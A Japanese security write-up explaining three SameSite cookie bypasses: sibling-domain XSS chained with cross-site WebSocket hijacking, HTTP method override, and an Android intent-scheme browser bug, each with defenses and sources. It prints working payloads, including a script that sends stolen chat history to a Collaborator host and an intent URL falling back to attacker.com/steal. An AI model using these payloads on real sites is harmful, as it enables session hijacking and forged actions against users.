## sibling domainとSameSite bypass実践write-up

SameSite Cookie が普及した現在（2020年以降、Chrome では既定値が `SameSite=Lax` に変更済み）でも、CSRF や関連攻撃は死んでいない。むしろ「SameSite があるから安全」という思い込みが、開発者の防御を薄くしている。この節では、SameSite を「回避（bypass）」する 3 つの代表的な実戦テクニックを、実際の write-up・研究をもとに仕組みレベルで解剖する。

- **sibling domain（兄弟ドメイン）経由**の SameSite Strict 突破と、CSWSH（Cross-Site WebSocket Hijacking）連携
- **Method Override（メソッド上書き）**による SameSite Lax の突破
- **intent スキーム（Android）**による SameSite Strict のブラウザ実装バグ突破

いずれも共通する原理は「**ブラウザが `same-site`（同一サイト）と判定する条件と、攻撃者が実際に狙う操作の危険性が一致していない**」という点にある。まずこの前提を押さえておこう。

### 前提: 「same-site」判定は eTLD+1 単位、しかも緩い

SameSite Cookie の可否は、リクエストの**送信元（initiator）**と**宛先（target）**が「same-site かどうか」で決まる。ここで言う site とは「スキーム + eTLD+1（登録可能ドメイン）」である。eTLD（effective Top-Level Domain、実効トップレベルドメイン。`.com` や `.co.jp`、`.web-security-academy.net` のように「その下は誰でも登録できる」境界）に、その 1 つ左のラベルを足したものが eTLD+1 だ。

重要なのは、**same-site はホスト名の完全一致ではない**ということ。`a.example.com` と `b.example.com` はホストが違っても、eTLD+1 が同じ `example.com` なので **same-site** と扱われる。この「兄弟（sibling）関係のサブドメインは同一サイト」という緩さが、最初の攻撃の入口になる。

さらに `SameSite=Lax`（既定値）には抜け穴がある。Lax は「**トップレベルナビゲーション**（ユーザーがリンクを踏む・`window.location` で遷移するような、アドレスバーが変わる遷移）**かつ安全なメソッド（GET/HEAD）**」であれば、クロスサイトでも Cookie を送る。これが 2 つ目の攻撃（Method Override）の入口になる。

---

### 1. sibling domain 経由の SameSite Strict 突破 + CSWSH

#### 攻撃シナリオの全体像

PortSwigger の Web Security Academy ラボ「SameSite Strict bypass via sibling domain」は、次の連鎖を示している。

1. メインアプリ（`YOUR-LAB-ID.web-security-academy.net`）にチャット機能があり、**WebSocket ハンドシェイクに CSRF トークンが無い** → CSWSH に脆弱
2. しかしセッション Cookie は `SameSite=Strict` なので、**外部サイトから直接** WebSocket を張ってもハンドシェイクに Cookie が乗らず、他人のセッションを乗っ取れない（新規セッションの履歴しか取れない）
3. ところが**兄弟ドメイン**である CMS（`cms-YOUR-LAB-ID.web-security-academy.net`）にリフレクテッド XSS がある
4. 攻撃者は被害者を CMS の XSS に誘導 → **CMS 上で動く JavaScript は「same-site」**なので、そこから張った WebSocket には `SameSite=Strict` の Cookie が正しく乗る → CSWSH が成立し、チャット履歴（＝認証情報）を盗める

つまり「**同一サイト内の 1 ドメインを XSS で奪えば、SameSite=Strict は事実上無力化される**」。SameSite はサイト**間**の防御であって、サイト**内**の乗っ取りには何の効果も無い、という教訓だ。

用語を補足すると:
- **CSWSH（Cross-Site WebSocket Hijacking）**: WebSocket の接続確立（ハンドシェイク）が HTTP リクエストとして飛ぶことを利用し、攻撃者ページから被害者の Cookie 付きで WebSocket を張って、双方向通信を乗っ取る攻撃。ハンドシェイクに CSRF トークンや Origin 検証が無いと成立する。
- **sink（シンク）**: 入力が最終的に実行・解釈される危険な代入先。ここでは CMS ログインの `username` パラメータが、無害化されずに HTML へ反映される sink になっている。

#### CSWSH のペイロード

まず、CSWSH 本体となるスクリプトはこれだ。

```javascript
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

**なぜこれで履歴が盗めるのか**:
- `new WebSocket('wss://.../chat')` を CMS 上（same-site コンテキスト）で実行すると、ハンドシェイクの HTTP リクエストに `SameSite=Strict` のセッション Cookie が乗る。サーバは正規ユーザーとして接続を受け入れる。
- このアプリのサーバは `"READY"` を受け取ると**チャット履歴全体を送り返す**仕様。`ws.send("READY")` でそれを引き出す。
- `ws.onmessage` で受け取ったデータ（`event.data`）を、`fetch(..., {mode:'no-cors'})` で攻撃者の Burp Collaborator（`oastify.com`）へ POST 送信して外部流出（exfiltration）させる。`mode:'no-cors'` はレスポンスを読めない代わりに CORS プリフライトを避け、単純に「送りつける」ためのモード。

#### 兄弟ドメインの XSS へ注入する

上の CSWSH スクリプトを、CMS ログインの `username` パラメータ（無害化されない反射点）に注入する。まず XSS 自体の確認は次のように行える。

```
https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=<script>alert(1)</script>&password=anything
```

そして被害者を誘導する最終エクスプロイト（攻撃者ドメインに置くページ）は次の形になる。CSWSH スクリプトを **URL エンコードして** `username` に埋め込む。

```javascript
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```

**なぜ `document.location` による遷移なのか**:
- 攻撃者ページ（クロスサイト）から CMS へ**トップレベルナビゲーション**で遷移させる。遷移先の CMS 上で XSS が発火すると、そのスクリプトの実行コンテキストは `cms-....web-security-academy.net`、すなわちメインアプリと **eTLD+1 が同じ same-site** になる。
- したがって、その中で張る WebSocket は same-site リクエストとなり、`SameSite=Strict` Cookie が乗る。ここが突破の核心だ。攻撃者ページから直接 WebSocket を張ったのでは cross-site 扱いで Cookie が乗らないが、「一度 same-site の XSS を踏み台にする」ことでこの壁を越える。

#### 兄弟ドメインの見つけ方

このラボでは、メインアプリのレスポンスに含まれる `Access-Control-Allow-Origin` ヘッダから CMS ドメインの存在を推測できる。実務でも、CORS 設定・CSP の `connect-src`／`frame-ancestors`・リンク・証明書の SAN（Subject Alternative Name）・サブドメイン列挙などから兄弟ドメインを洗い出すのが定石になる。

#### 防御

- **XSS を根絶する**のが第一。SameSite は same-site の XSS を前提にすると無力なので、出力エスケープ・CSP を徹底する。
- WebSocket ハンドシェイクに **CSRF トークンを必須化**し、**Origin ヘッダを厳格に検証**する（`Origin` がアプリ本体のオリジンと完全一致する場合のみ受理。兄弟ドメインからの接続も拒否する）。
- サブドメインを分離し、信頼できないコンテンツ（CMS 等）は eTLD+1 を分けた別サイトに置く（例: 完全に別のドメイン）。そうすれば sibling 扱いにならず SameSite の壁が復活する。
- セッション Cookie に加えて重要操作へ再認証・トークンを求める。

> 出典: PortSwigger Web Security Academy — Lab: SameSite Strict bypass via sibling domain — https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

---

### 2. Method Override による SameSite Lax 突破

#### なぜ Lax は「GET だけ許す」のか、そこが穴になる

`SameSite=Lax`（Chrome 80 以降の既定値）は、クロスサイトからのリクエストでも「**トップレベルナビゲーション かつ GET/HEAD**」であれば Cookie を送る。ログイン状態を保ったまま外部リンクから普通に遷移できるようにするための緩和策だ。逆に言えば、**クロスサイトの POST には Cookie を送らない** → これが CSRF 対策として機能する、という設計になっている。

ここで多くの Web フレームワークが持つ「**HTTP Method Override（メソッド上書き）**」機能が牙を剥く。HTML の `<form>` は歴史的経緯から GET と POST しか送れないため、`PUT`／`DELETE`／`PATCH` を使いたい RESTful なアプリのために、フレームワークは次の 2 つの手段で「見かけの GET/POST を、サーバ側で別メソッドに読み替える」機能を用意している。

- **`_method` パラメータ**: フォームの hidden フィールドや、クエリ文字列に `_method=PUT` を入れると、サーバはそのリクエストを PUT として処理する。
- **`X-HTTP-Method-Override` ヘッダ**: 同じことをヘッダで行う。

この読み替えが攻撃者にとって都合が良いのは、「**ブラウザは実際に飛んだメソッド（GET）だけを見て SameSite を判定するが、サーバは上書き後のメソッド（POST/PUT/DELETE）で状態変更処理を実行する**」という**判定の不一致**を作り出せるからだ。

#### 攻撃の流れ

1. 本来は POST/PUT/DELETE でしか受け付けない状態変更エンドポイント（送金・パスワード変更など）を狙う
2. 攻撃者は被害者を、**GET のトップレベルナビゲーション**でそのエンドポイントに遷移させる。URL に `_method` を付けて上書きを仕込む
3. ブラウザから見れば「GET のトップレベルナビゲーション」なので、`SameSite=Lax` の Cookie が乗る
4. サーバは `_method` を読み取り、POST/PUT/DELETE として**認証済みの状態変更**を実行してしまう

原典が示す最小の PoC は次の通り。

```javascript
<script>
    document.location = "https://hazanasec.github.io/send?amount=1000&_method=POST";
</script>
```

**なぜこれで突破できるのか**:
- `document.location` への代入は GET のトップレベルナビゲーション → Lax でも Cookie が送られる。
- サーバ側フレームワークが `_method=POST`（記事の例では GET エンドポイントを POST 扱いに読み替えるケース。実際には「本来 POST 必須の処理を GET で叩けるようにする」向きが典型的に危険）を解釈し、状態変更ハンドラを起動する。
- ポイントは「攻撃者は POST リクエストを一切送っていない（＝クロスサイト POST の SameSite 制限を踏まない）のに、サーバ側では POST 相当の処理が走る」こと。

フォーム版も紹介されている。フォーム送信も**トップレベルナビゲーション**と見なされるため、method override を仕込んでも Cookie が乗る。

```html
<form action="https://example.com/transfer" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
```

ヘッダ版はこうだ（JavaScript で任意ヘッダを付けられる状況、あるいはヘッダ上書きを許すプロキシ・ミドルウェア構成で成立する）。

```http
POST /transfer HTTP/1.1
X-HTTP-Method-Override: GET
```

#### 影響を受けるフレームワーク

原典は、`_method` パラメータや `X-HTTP-Method-Override` ヘッダを（標準または一般的なミドルウェアで）解釈するフレームワークを幅広く列挙している。

| フレームワーク | `_method` パラメータ | `X-HTTP-Method-Override` ヘッダ |
|---|---|---|
| Symfony / Rails / Laravel / CodeIgniter | 対応 | 対応 |
| CakePHP / Yii / Ember.js / Meteor | 対応 | 対応 |
| Flask / Django / Spring MVC / ASP.NET Core | パラメータは非対応 | 対応 |
| Express.js / Koa.js / Bottle | ミドルウェアで対応 | 対応 |
| Phoenix | 対応 | 対応 |

（列挙は原典時点＝2023年7月の記述に基づく。既定で有効か、明示的に導入したミドルウェアで有効かはフレームワークにより異なるので、自分のスタックの実際の挙動を必ず確認すること。）

#### 防御

- 状態変更エンドポイントでは**メソッド上書きに依存しない**。特に「本来 POST 必須の処理が `_method` で GET から叩ける」構成を排除する。
- 不要なら **method override ミドルウェアを本番で無効化**する。
- SameSite に頼らず、**メソッド非依存の CSRF トークン**を必須化する（トークンが無ければ、GET だろうが上書きだろうが弾かれる）。これが最も確実。
- 機微な操作には `SameSite=Strict` を併用し、さらに再認証を求める。

> 出典: hazanasec — Bypassing SameSite Cookie restriction with method override — https://hazanasec.github.io/2023-07-30-Samesite-bypass-method-override.md/

---

### 3. Android の intent スキームによる SameSite Strict 突破（ブラウザ実装バグ）

これまでの 2 つが「仕様の穴・アプリ側の設定ミス」を突くものだったのに対し、これは**ブラウザ実装のバグ**による SameSite Strict の突破である。時事性が強いので、対象バージョンと修正状況を明記して読む必要がある。

#### intent スキームとは

Android の **intent スキーム（`intent://` URL）**は、ブラウザから他アプリを起動するための外部プロトコルハンドラだ。例えばブラウザから地図アプリへ、SMS からブラウザへ、といった「アプリ間の橋渡し」を担う。構文は次のようになっている。

```
intent://<host/path>#Intent;scheme=<scheme>;package=<package>;S.browser_fallback_url=<url>;end
```

`S.browser_fallback_url` は「指定パッケージのアプリが存在しない・起動できない場合に、代わりにブラウザで開く URL」を指定する **fallback（フォールバック、代替遷移先）**だ。

#### バグの本質: fallback 遷移が「same-site 相当」に化ける

セキュリティ研究者 Axel Chong が発見したのは、**Web サーバが `intent://` URL への HTTP リダイレクトを発行すると、`SameSite=Strict` の Cookie が乗ってしまう**という Chromium（Android 版 Chrome）の挙動だった。本来クロスサイトのリダイレクトでは Strict Cookie は送られないはずなのに、intent 経由の遷移がこの判定をすり抜ける。同時に、リクエストの出所を示す **`Sec-Fetch-Site` ヘッダも回避**されてしまう。どちらも CSRF 対策の要なので、両方を無力化できることになる。

Certus Cybersecurity の解説では、次のように「`/poc` パスが intent へのリダイレクトを返す」構成で再現している。

```http
HTTP/1.1 302 Found
Location: intent://httpbin.org/headers#Intent;scheme=https;package=com.android.chrome;end
```

被害者が攻撃者ページ（`/poc`）を Chrome mobile で開くと、この intent リダイレクトによって `httpbin.org` へ遷移するが、その際 `SameSite=Strict` Cookie が乗ってしまう、という流れだ。

Firefox for Android（CVE-2022-45413）では、より明確に **fallback URL の悪用**として現れた。

```
intent://192.168.1.70#Intent;scheme=http;package=garbage;S.browser_fallback_url=http://attacker.com/steal;end
```

**なぜこれで突破できるのか**:
- `package=garbage`（存在しないパッケージ名）を指定すると、intent の起動が失敗する。
- 失敗すると `S.browser_fallback_url` の URL がブラウザで読み込まれるが、この fallback ロードが「外部由来（external）」として適切なフラグ付けをされず、**`SameSite=Strict` Cookie の制限を考慮しないまま**リクエストが飛ぶ。
- 結果として、クロスサイトのはずの遷移に Strict Cookie が乗り、CSRF の踏み台になる。

#### 対象バージョンと修正状況

- **Chromium / Android 版 Chrome**: 研究者は **109.0.5397.0（Android Chrome Canary、2022年11月）**で修正を確認。当時 `chrome://flags/#enable-experimental-cookie-features` を有効化すると、通常のリダイレクトで SameSite Cookie が送られない安全な挙動に戻せた（暫定回避策）。The Daily Swig の報道は 2023年3月。
- **Firefox for Android（CVE-2022-45413）**: **105〜106 が影響（当初 wontfix）**、**107 以降で修正**。修正内容は、fallback URL の `loadUrl` 呼び出しに `external()` フラグを立て、cross-site ロードとして Cookie 送信を正しく制限するもの。

> ⚠️ **一部未取得の資料**: 元記事「The Daily Swig: Chromium bug allowed SameSite cookie bypass on Android devices」本文は自動取得できませんでした（理由: WebFetch が PortSwigger のトップページを返し記事本文に到達できなかったため）。以下の URL からご自身で直接ご覧ください: https://portswigger.net/daily-swig/chromium-bug-allowed-samesite-cookie-bypass-on-android-devices
>
> 上記の技術詳細は、同記事の検索スニペット、Mozilla Bugzilla（CVE-2022-45413）、Certus Cybersecurity の解説記事から補完しています。

#### 防御

- **ブラウザを最新に保つ**（Chrome 109 以降、Firefox 107 以降）。これは実装バグなので、恒久対策はベンダ修正の適用が本筋。
- アプリ側では、**自サイトへ跳ね返る `intent://` リダイレクトを生成しない**（オープンリダイレクトの一種として intent スキームを扱い、リダイレクト先をホワイトリスト化する）。
- SameSite / `Sec-Fetch-Site` に「唯一の防御」として依存せず、状態変更には**独立した CSRF トークン**を必須化する。ブラウザ実装バグでヘッダ系の防御が丸ごと外れうる、という事実がこの多層防御の重要性を示している。

> 出典: The Daily Swig — Chromium bug allowed SameSite cookie bypass on Android devices — https://portswigger.net/daily-swig/chromium-bug-allowed-samesite-cookie-bypass-on-android-devices
> 出典（補完）: Mozilla Bugzilla, CVE-2022-45413 — https://bugzilla.mozilla.org/show_bug.cgi?id=1791201 ／ Certus Cybersecurity — How to Bypass SameSite Cookie Check on Android Browser — https://www.certuscyber.com/insights/bypass-samesite-cookie/

---

### この節のまとめ

3 つの bypass は、攻撃対象の層こそ違うが、教訓は一つに収束する。

| テクニック | 突く層 | 核心の原理 | 恒久対策 |
|---|---|---|---|
| sibling domain + CSWSH | アプリ設計（same-site の緩さ） | 兄弟サブドメインの XSS は same-site → Strict Cookie が乗る | XSS 根絶・WS の Origin/トークン検証・信頼境界でドメイン分離 |
| Method Override | フレームワーク仕様 | GET と判定させて POST 処理を実行させる判定不一致 | メソッド非依存の CSRF トークン・override 無効化 |
| intent スキーム（Android） | ブラウザ実装バグ | intent 経由の遷移が Strict/`Sec-Fetch-Site` をすり抜ける | ブラウザ更新・intent リダイレクト排除・独立トークン |

いずれの場合も、**SameSite Cookie は「多層防御の 1 枚」であって、それ単体を CSRF の唯一の防御にしてはならない**。sink となる XSS を潰し、Origin を厳格に検証し、メソッドに依存しない CSRF トークンを併用する。この 3 点を土台に置いてこそ、SameSite は本来の価値を発揮する。

> 本節は防御・学習目的の解説である。示したペイロードは PortSwigger のラボ環境や自身が管理する検証環境でのみ再現し、実在サービスや本番環境への無許可の検証には決して用いないこと。
